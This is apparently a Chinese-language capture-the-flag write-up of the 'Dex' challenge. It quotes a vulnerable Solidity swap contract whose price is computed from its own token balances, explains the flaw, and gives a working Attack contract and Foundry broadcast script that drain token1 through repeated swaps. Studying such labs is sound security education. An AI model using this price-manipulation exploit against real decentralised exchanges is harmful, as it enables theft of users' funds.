# Dex approve transferfrom token交换 IERC20

# 源码

一开始小狐狸钱包有10个token1和10个token2，dex合约有100个token1和100个token2

目标：掏空dex的token1或token2

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

//0x26366CaA4655681288B3b4460AFeD3B7f2665Ec7

//此题目的目标是让您破解下面的基本合约并通过价格操纵窃取资金。
//一开始您可以得到10个token1和token2。合约以每个代币100个开始。
//如果您设法从合约中取出两个代币中的至少一个，并让合约得到一个的“坏”的token价格，您将在此级别上取得成功。
//注意： 通常，当您使用ERC20代币进行交换时，您必须approve合约才能为您使用代币。
//为了与题目的语法保持一致，我们刚刚向合约本身添加了approve方法。
//因此，请随意使用 contract.approve(contract.address, <uint amount>)
//而不是直接调用代币，它会自动批准将两个代币花费所需的金额。 请忽略SwappableToken合约。

abstract contract Dex is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function addLiquidity(
        address token_address,
        uint256 amount
    ) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require(
            (from == token1 && to == token2) ||
                (from == token2 && to == token1),
            "Invalid tokens"
        );
        require(
            IERC20(from).balanceOf(msg.sender) >= amount,
            "Not enough to swap"
        );
        uint256 swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapPrice(
        address from,
        address to,
        uint256 amount
    ) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) /
            IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableToken(token1).approve(msg.sender, spender, amount);
        SwappableToken(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(
        address token,
        address account
    ) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableToken is ERC20 {
    address private _dex;

    constructor(
        address dexInstance,
        string memory name,
        string memory symbol,
        uint256 initialSupply
    ) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}

```

# 思路

首先注意到合约里有几个`onlyOwner`函数,找了一圈发现没有地方能设置我们为owner,那就是不能用这几个函数了,看看public的

这是两个关键函数:

```solidity
function swap(address from, address to, uint256 amount) public {
        require(
            (from == token1 && to == token2) ||
                (from == token2 && to == token1),
            "Invalid tokens" //from和to只是token1和token2的地址,不分是谁的
        );
        require(
            IERC20(from).balanceOf(msg.sender) >= amount, //msg.sender的这种代币要充足
            "Not enough to swap"
        );
        uint256 swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount); //dex合约使用transferfrom,那就意味着需要msg.sender给dex合约先approve授权
        IERC20(to).approve(address(this), swapAmount); //dex授权自己可以转自己的token
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount); //把dex的代币转给msg.sender
    }

    function getSwapPrice(
        address from,
        address to,
        uint256 amount
    ) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) /
            IERC20(from).balanceOf(address(this))); //比率会随着dex合约的token数量改变,不固定,给了我们可乘之机
    }
```

# poc

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Dex} from "./dex.sol";
import "../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

contract Attack {
    Dex public dex;
    IERC20 public token1;
    IERC20 public token2;

    constructor(address addr) {
        dex = Dex(addr);
        token1 = IERC20(dex.token1());
        token2 = IERC20(dex.token2());
    }

    function attack() external {
        token1.transferFrom(msg.sender, address(this), 10); //攻击合约从eoa转走10个token1给攻击合约
        token2.transferFrom(msg.sender, address(this), 10); //攻击合约从eoa转走10个token2给攻击合约
        token1.approve(address(dex), type(uint256).max); //攻击合约授权给dex合约
        token2.approve(address(dex), type(uint256).max); //攻击合约授权给dex合约,这俩是为了swap函数里的transferfrom准备
        dex.swap(address(token1), address(token2), 10); //以下是攻击合约和dex进行token交换
        dex.swap(address(token2), address(token1), 20);
        dex.swap(
            address(token1),
            address(token2),
            dex.balanceOf(address(token1), address(this)) //24
        );
        dex.swap(
            address(token2),
            address(token1),
            dex.balanceOf(address(token2), address(this)) //30
        );
        dex.swap(
            address(token1),
            address(token2),
            dex.balanceOf(address(token1), address(this)) //41
        );

        dex.swap(address(token2), address(token1), 45); //掏空token1
        require(dex.balanceOf(address(token1), address(dex)) == 0, "no");
    }
}


// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Attack} from "../src/Attack.sol";
import {Dex} from "../src/dex.sol";
import {Script} from "forge-std/Script.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Attacksc is Script {
    function run() external {
        vm.startBroadcast();
        Dex dex = Dex(0x26366CaA4655681288B3b4460AFeD3B7f2665Ec7);
        Attack attack = new Attack(0x26366CaA4655681288B3b4460AFeD3B7f2665Ec7);
        address token1 = dex.token1();
        address token2 = dex.token2();
        IERC20 token1contract = IERC20(token1);
        IERC20 token2contract = IERC20(token2);
        token1contract.approve(address(attack), type(uint256).max); //授权攻击合约可以transferfrom走eoa的token1
        token2contract.approve(address(attack), type(uint256).max); //授权攻击合约可以transferfrom走eoa的token2
        attack.attack();
        vm.stopBroadcast();
    }
}

```


> 更新: 2025-07-27 10:33:05  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/nniio0qfhfiogoih>